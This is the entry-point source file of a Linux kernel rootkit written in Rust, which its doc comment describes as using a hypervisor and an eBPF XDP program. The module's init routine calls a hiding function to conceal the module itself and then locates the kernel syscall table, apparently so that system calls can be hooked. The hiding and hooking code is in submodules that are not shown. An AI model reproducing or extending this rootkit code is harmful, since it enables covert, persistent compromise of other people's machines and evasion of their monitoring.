//! A Linux kernel rootkit in Rust using a custom made type-2 hypervisor and eBPF XDP program.
//! To-do: complete doc

pub(crate) mod hiding;
pub(crate) mod hooking;
pub(crate) mod hypervisor;
#[macro_use]
pub(crate) mod utils;
pub(crate) mod xdp;

// pub(crate) use alloc::alloc;
pub(crate) use kernel::prelude::*;

module! {
    type: Blackpill,
    name: "blackpill",
    author: "Unknown",
    description: "Do we really need to add a description ?",
    license: "GPL",
}

struct Blackpill;

impl kernel::Module for Blackpill {
    fn init(module: &'static ThisModule) -> Result<Self> {
        pr_info!("Starting\n");

        hiding::hide(module);

        let syscall_table: Option<*mut *mut u64> = hooking::get_syscall_table();
        pr_info!("Syscall table address = {:?}", syscall_table);

        Ok(Blackpill)
    }
}

impl Drop for Blackpill {
    fn drop(&mut self) {
        pr_info!("Exiting\n");
    }
}
